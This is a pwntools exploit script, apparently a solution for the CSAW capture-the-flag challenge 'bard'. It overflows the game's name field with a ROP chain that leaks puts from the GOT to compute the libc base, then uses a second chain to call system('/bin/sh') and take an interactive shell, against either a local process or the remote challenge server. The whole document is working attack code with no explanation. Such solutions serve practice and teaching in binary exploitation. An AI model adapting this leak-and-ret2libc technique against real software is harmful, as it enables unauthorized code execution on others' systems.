#!/usr/bin/env -S python3

from pwn import *

binary = context.binary = ELF('./bard')
binary.symbols['game'] = 0x400f7c
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	libc = binary.libc
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	libc = ELF('libc-2.27.so')
	p = remote('pwn.chal.csaw.io', 5019)

def create(p,alignment,weapon,name):
	p.sendlineafter('choose thy alignment (g = good, e = evil):\n',alignment)
	p.sendlineafter(['2) +4 Crossbow of deadly accuracy\n','2) Stiletto of extreme disappointment\n'],str(weapon))
	p.sendafter('Enter thy name:\n',name)
	return

pause()

# 1st pass: leak libc
create(p,'g',1,'A')
for i in range(8): create(p,'e',1,'A')

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = b''
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.game)

create(p,'g',1,payload)

for i in range(10): p.sendlineafter('(r)un\n','r')
p.recvuntil('bravely runs away.\n')
_ = p.recv(6)
puts = u64(_ + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

# 2nd pass: get shell
create(p,'g',1,'A')
for i in range(8): create(p,'e',1,'A')

payload  = b''
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

create(p,'g',1,payload)

for i in range(10): p.sendlineafter('(r)un\n','r')
if not args.REMOTE: p.recvuntil('bravely runs away.\n')

p.interactive()
